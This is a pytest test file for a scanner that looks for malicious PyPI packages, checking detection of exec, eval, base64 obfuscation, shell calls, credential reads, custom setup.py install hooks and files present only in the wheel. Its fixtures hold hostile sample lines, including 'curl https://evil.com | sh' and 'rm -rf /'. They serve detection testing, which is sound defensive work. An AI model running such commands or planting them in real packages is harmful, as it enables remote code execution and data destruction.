"""Tests for PyPI artifact analysis."""

import tempfile
from pathlib import Path

import pytest

from radar.analysis.pypi_artifacts import (
    cleanup_tempdir,
    compare_sdist_wheel,
    fetch_latest_release_files,
    static_scan,
)


def test_fetch_latest_release_files():
    """Test extracting URLs from PyPI JSON."""
    info_json = {
        "urls": [
            {"url": "https://files.pythonhosted.org/packages/abc.tar.gz"},
            {"url": "https://files.pythonhosted.org/packages/xyz.whl"},
        ]
    }
    urls = fetch_latest_release_files(info_json)
    assert len(urls) == 2
    assert "abc.tar.gz" in urls[0]
    assert "xyz.whl" in urls[1]


def test_fetch_latest_release_files_empty():
    """Test with empty URLs."""
    info_json = {"urls": []}
    urls = fetch_latest_release_files(info_json)
    assert urls == []


def test_static_scan_no_directory():
    """Test static scan with missing directory."""
    risk, reasons = static_scan(None)
    assert risk == 0.0
    assert reasons == []


def test_static_scan_safe_code():
    """Test static scan with safe code."""
    with tempfile.TemporaryDirectory() as tmpdir:
        temp_path = Path(tmpdir)
        
        # Create a safe Python file
        safe_file = temp_path / "safe.py"
        safe_file.write_text("def hello():\n    return 'Hello, World!'\n")
        
        risk, reasons = static_scan(temp_path)
        assert risk == 0.0
        assert len(reasons) == 0


def test_static_scan_exec():
    """Test detection of exec()."""
    with tempfile.TemporaryDirectory() as tmpdir:
        temp_path = Path(tmpdir)
        
        malicious_file = temp_path / "malicious.py"
        malicious_file.write_text("exec(input('Enter code: '))\n")
        
        risk, reasons = static_scan(temp_path)
        assert risk > 0.0
        assert any("exec" in r.lower() for r in reasons)


def test_static_scan_eval():
    """Test detection of eval()."""
    with tempfile.TemporaryDirectory() as tmpdir:
        temp_path = Path(tmpdir)
        
        malicious_file = temp_path / "evil.py"
        malicious_file.write_text("result = eval(user_input)\n")
        
        risk, reasons = static_scan(temp_path)
        assert risk > 0.0
        assert any("eval" in r.lower() for r in reasons)


def test_static_scan_base64_decode():
    """Test detection of base64 decoding."""
    with tempfile.TemporaryDirectory() as tmpdir:
        temp_path = Path(tmpdir)
        
        obfuscated_file = temp_path / "obfuscated.py"
        obfuscated_file.write_text(
            "import base64\n"
            "code = base64.b64decode(b'cHJpbnQoImhlbGxvIik=')\n"
        )
        
        risk, reasons = static_scan(temp_path)
        assert risk > 0.0
        assert any("base64" in r.lower() or "obfuscation" in r.lower() for r in reasons)


def test_static_scan_subprocess_shell():
    """Test detection of subprocess with shell=True."""
    with tempfile.TemporaryDirectory() as tmpdir:
        temp_path = Path(tmpdir)
        
        dangerous_file = temp_path / "shell_exec.py"
        dangerous_file.write_text(
            "import subprocess\n"
            "subprocess.call('rm -rf /', shell=True)\n"
        )
        
        risk, reasons = static_scan(temp_path)
        assert risk > 0.0
        assert any("shell" in r.lower() or "execution" in r.lower() for r in reasons)


def test_static_scan_os_system():
    """Test detection of os.system()."""
    with tempfile.TemporaryDirectory() as tmpdir:
        temp_path = Path(tmpdir)
        
        dangerous_file = temp_path / "os_exec.py"
        dangerous_file.write_text(
            "import os\n"
            "os.system('curl https://evil.com | sh')\n"
        )
        
        risk, reasons = static_scan(temp_path)
        assert risk > 0.0
        assert any("command" in r.lower() or "execution" in r.lower() for r in reasons)


def test_static_scan_credential_access():
    """Test detection of credential reading."""
    with tempfile.TemporaryDirectory() as tmpdir:
        temp_path = Path(tmpdir)
        
        cred_file = temp_path / "credentials.py"
        cred_file.write_text(
            "import os\n"
            "api_key = os.environ.get('SECRET_KEY')\n"
            "password = os.getenv('PASSWORD')\n"
        )
        
        risk, reasons = static_scan(temp_path)
        assert risk > 0.0
        assert any("credential" in r.lower() or "environment" in r.lower() for r in reasons)


def test_static_scan_suspicious_setup():
    """Test detection of suspicious setup.py."""
    with tempfile.TemporaryDirectory() as tmpdir:
        temp_path = Path(tmpdir)
        
        setup_file = temp_path / "setup.py"
        setup_file.write_text(
            "from setuptools import setup\n"
            "setup(\n"
            "    name='evil',\n"
            "    cmdclass={'install': CustomInstall}\n"
            ")\n"
        )
        
        risk, reasons = static_scan(temp_path)
        assert risk > 0.0
        # Should detect custom command classes


def test_static_scan_init_with_execution():
    """Test detection of code execution in __init__.py."""
    with tempfile.TemporaryDirectory() as tmpdir:
        temp_path = Path(tmpdir)
        pkg_dir = temp_path / "mypackage"
        pkg_dir.mkdir()
        
        init_file = pkg_dir / "__init__.py"
        init_file.write_text(
            "import os\n"
            "import sys\n"
            "# This is a comment\n"
            "exec(open('/tmp/payload.py').read())\n"
            "for i in range(10):\n"
            "    os.system('echo hello')\n"
        )
        
        risk, reasons = static_scan(temp_path)
        assert risk > 0.0
        assert any("import" in r.lower() or "exec" in r.lower() for r in reasons)


def test_static_scan_multiple_issues():
    """Test with multiple dangerous patterns."""
    with tempfile.TemporaryDirectory() as tmpdir:
        temp_path = Path(tmpdir)
        
        # Create multiple files with issues
        (temp_path / "file1.py").write_text("exec('malicious')")
        (temp_path / "file2.py").write_text("eval('dangerous')")
        (temp_path / "file3.py").write_text("import base64; base64.b64decode(payload)")
        
        risk, reasons = static_scan(temp_path)
        assert risk > 0.0
        assert len(reasons) >= 3


def test_static_scan_caps_at_one():
    """Test that risk score caps at 1.0."""
    with tempfile.TemporaryDirectory() as tmpdir:
        temp_path = Path(tmpdir)
        
        # Create many files with issues (more than 10)
        for i in range(20):
            (temp_path / f"evil{i}.py").write_text(f"exec('payload{i}')")
        
        risk, reasons = static_scan(temp_path)
        assert risk <= 1.0


def test_compare_sdist_wheel_none():
    """Test comparison with None inputs."""
    has_mismatch, reasons = compare_sdist_wheel(None, None)
    assert not has_mismatch
    assert reasons == []


def test_compare_sdist_wheel_wheel_only_files():
    """Test detection of files only in wheel."""
    with tempfile.TemporaryDirectory() as sdist_tmp, tempfile.TemporaryDirectory() as wheel_tmp:
        sdist_path = Path(sdist_tmp)
        wheel_path = Path(wheel_tmp)
        
        # Create shared files
        (sdist_path / "module.py").write_text("# shared")
        (wheel_path / "module.py").write_text("# shared")
        
        # Create wheel-only file
        (wheel_path / "injected.py").write_text("# malicious")
        
        has_mismatch, reasons = compare_sdist_wheel(sdist_path, wheel_path)
        assert has_mismatch
        assert any("wheel contains" in r.lower() for r in reasons)


def test_compare_sdist_wheel_suspicious_setup():
    """Test detection of exec/eval in setup.py."""
    with tempfile.TemporaryDirectory() as sdist_tmp, tempfile.TemporaryDirectory() as wheel_tmp:
        sdist_path = Path(sdist_tmp)
        wheel_path = Path(wheel_tmp)
        
        # Create setup.py with exec
        setup_file = sdist_path / "setup.py"
        setup_file.write_text(
            "from setuptools import setup\n"
            "exec(open('inject.py').read())\n"
            "setup(name='evil')\n"
        )
        
        has_mismatch, reasons = compare_sdist_wheel(sdist_path, wheel_path)
        assert has_mismatch
        assert any("setup.py" in r and ("exec" in r or "eval" in r) for r in reasons)


def test_cleanup_tempdir():
    """Test cleanup of temporary directory."""
    with tempfile.TemporaryDirectory() as tmpdir:
        temp_path = Path(tmpdir)
        test_file = temp_path / "test.txt"
        test_file.write_text("test")
        
        assert test_file.exists()
        cleanup_tempdir(temp_path)
        # Directory is removed
        # Note: Can't assert not exists because tempfile context manager
        # already marked for deletion


def test_cleanup_tempdir_none():
    """Test cleanup with None input."""
    # Should not raise
    cleanup_tempdir(None)


def test_cleanup_tempdir_nonexistent():
    """Test cleanup with non-existent path."""
    fake_path = Path("/nonexistent/path/that/does/not/exist")
    # Should not raise
    cleanup_tempdir(fake_path)
